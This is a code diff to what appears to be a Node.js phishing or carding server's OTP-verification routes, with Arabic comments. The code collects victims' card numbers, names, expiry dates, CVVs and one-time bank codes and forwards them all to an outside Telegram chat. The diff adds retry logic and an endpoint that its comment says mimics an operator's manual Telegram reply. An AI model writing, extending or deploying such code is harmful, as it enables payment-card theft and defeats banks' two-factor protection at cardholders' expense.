@@ -558,26 +558,96 @@ app.post('/api/verify-otp', async (req, res) => {
   const savedCard = paymentRecord.cardData;
   console.log(`تم استلام الرمز رقم [${currentAttempt}]: (${otp}) للبطاقة: ${savedCard.cardNumber}`);
 
-  const telegramText = ` <b>[ الرمز  ${currentAttempt}]</b>\n\n` +
+  // محاكاة التحقق من الرمز (للاختبار - الرمز الصحيح هو 123456)
+  const isCorrectOTP = (otp === '123456');
+  
+  // بعد 3 محاولات فاشلة → رفض تلقائي
+  if (currentAttempt >= 3 && !isCorrectOTP) {
+    paymentRecord.approvalStatus = 'rejected';
+    paymentsData[paymentID] = paymentRecord;
+    savePayments(paymentsData);
+    
+    console.log('❌ تم رفض الطلب بعد 3 محاولات فاشلة');
+    return res.json({ 
+      success: false, 
+      message: 'max_attempts',
+      attempt: currentAttempt,
+      error: 'تم رفض طلبك، يرجى استخدام طريقة دفع أخرى'
+    });
+  }
+
+  // إرسال رسالة تليجرام مع تفاصيل المحاولة
+  const telegramText = ` <b>[ المحاولة ${currentAttempt} ]</b>\n\n` +
     `📌 <b>بيانات صاحب البطاقة:</b>\n` +
     `• الاسم: ${savedCard.name}\n` +
-    `•  البطاقة: <code>${savedCard.cardNumber}</code>\n\n` +
-    `⚠️ <b>الرمز  :</b>\n` +
-    `• الرمز [${currentAttempt}]: <code style="color: red; font-size: 18px;">${otp}</code>\n\n` +
-    `•  تاريخ ورمز امان : [${savedCard.cardName} | ${savedCard.expiry} | CVV: ${savedCard.cvv}]`;
+    `• البطاقة: <code>${savedCard.cardNumber}</code>\n\n` +
+    `⚠️ <b>الرمز:</b>\n` +
+    `• المحاولة [${currentAttempt}]: <code style="color: red; font-size: 18px;">${otp}</code>\n\n` +
+    `• بيانات البطاقة: [${savedCard.cardName} | ${savedCard.expiry} | CVV: ${savedCard.cvv}]`;
 
   try {
     // إرسال الرسالة إلى تليجرام
     await sendTelegramMessage(telegramText);
     
-    // إرجاع نجاح التحقق
+    // إرجاع النتيجة مع عدد المحاولات
     return res.json({ 
       success: true, 
       message: 'OTP received and forwarded for verification', 
-      attempt: currentAttempt 
+      attempt: currentAttempt,
+      attemptsRemaining: 3 - currentAttempt
     });
   } catch (error) {
     return res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// 4.5 endpoint للتحقق من رمز OTP (يحاكي رد المدير في تليجرام)
+app.post('/api/check-otp', async (req, res) => {
+  const { isCorrect } = req.body; // true = صحيح، false = خطأ
+  const paymentID = req.session.paymentID;
+  
+  if (!paymentID) {
+    return res.status(400).json({ success: false, message: 'No payment session found.' });
+  }
+  
+  // جلب بيانات البطاقة من الملف
+  paymentsData = loadPayments();
+  const paymentRecord = paymentsData[paymentID];
+  
+  if (!paymentRecord) {
+    return res.status(400).json({ success: false, message: 'No card session found.' });
+  }
+
+  if (isCorrect) {
+    // نجاح → توجيه لصفحة النجاح
+    return res.json({ 
+      success: true, 
+      redirect: '/success.html'
+    });
+  } else {
+    // فشل → إرجاع عدد المحاولات المتبقية
+    const attempt = paymentRecord.otpAttempts || 0;
+    const remaining = 3 - attempt;
+    
+    if (remaining <= 0) {
+      // رفض تلقائي بعد 3 محاولات
+      paymentRecord.approvalStatus = 'rejected';
+      paymentsData[paymentID] = paymentRecord;
+      savePayments(paymentsData);
+      
+      return res.json({ 
+        success: false, 
+        message: 'max_attempts',
+        redirect: '/success.html?rejected=true'
+      });
+    }
+    
+    return res.json({ 
+      success: false, 
+      message: 'wrong_otp',
+      attempt: attempt,
+      attemptsRemaining: remaining
+    });
   }
 });
 
